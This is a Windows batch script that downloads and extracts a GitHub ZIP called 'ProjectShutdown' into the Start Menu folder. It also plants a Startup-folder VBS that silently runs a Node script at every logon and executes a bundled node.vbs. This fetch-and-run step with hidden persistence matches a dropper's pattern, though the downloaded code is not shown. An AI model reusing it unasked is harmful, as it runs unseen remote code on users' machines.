@echo off
setlocal

REM ==============================
REM Variables
REM ==============================
set ZIP_URL=https://github.com/Siddarth-abcs/ProjectShutdown/archive/refs/heads/main.zip

REM Programs folder
set PROGRAMS=%APPDATA%\Microsoft\Windows\Start Menu\Programs

REM Startup folder
set TARGET_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

set ZIP_NAME=ProjectShutdown.zip
set EXTRACT_FOLDER=ProjectShutdown-main

REM ==============================
REM Download ZIP
REM ==============================
echo Downloading ProjectShutdown...

powershell -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%PROGRAMS%\%ZIP_NAME%'"

if not exist "%PROGRAMS%\%ZIP_NAME%" (
    echo Download failed.
    pause
    exit /b
)

echo Download successful.

REM ==============================
REM Extract ZIP
REM ==============================
echo Extracting ZIP...

powershell -Command "Expand-Archive -Force '%PROGRAMS%\%ZIP_NAME%' '%PROGRAMS%'"

if not exist "%PROGRAMS%\%EXTRACT_FOLDER%" (
    echo Extraction failed.
    pause
    exit /b
)

echo Extraction successful.

REM ==============================
REM Ensure Startup directory exists
REM ==============================
if not exist "%TARGET_DIR%" (
    mkdir "%TARGET_DIR%"
)

REM ==============================
REM Create start.vbs in Startup
REM ==============================
echo Creating start.vbs at:
echo %TARGET_DIR%

echo Set shell = CreateObject("WScript.Shell")> "%TARGET_DIR%\start.vbs"
echo shell.Run "node ""%PROGRAMS%\%EXTRACT_FOLDER%\startup.js""", 0, False>> "%TARGET_DIR%\start.vbs"

if exist "%TARGET_DIR%\start.vbs" (
    echo start.vbs created successfully.
) else (
    echo Failed to create start.vbs.
)

REM ==============================
REM Run existing node.vbs
REM ==============================
set NODE_VBS_PATH=%PROGRAMS%\%EXTRACT_FOLDER%\node.vbs

if exist "%NODE_VBS_PATH%" (
    echo Running node.vbs...
    cscript //nologo "%NODE_VBS_PATH%"
) else (
    echo node.vbs not found at %NODE_VBS_PATH%
)

pause
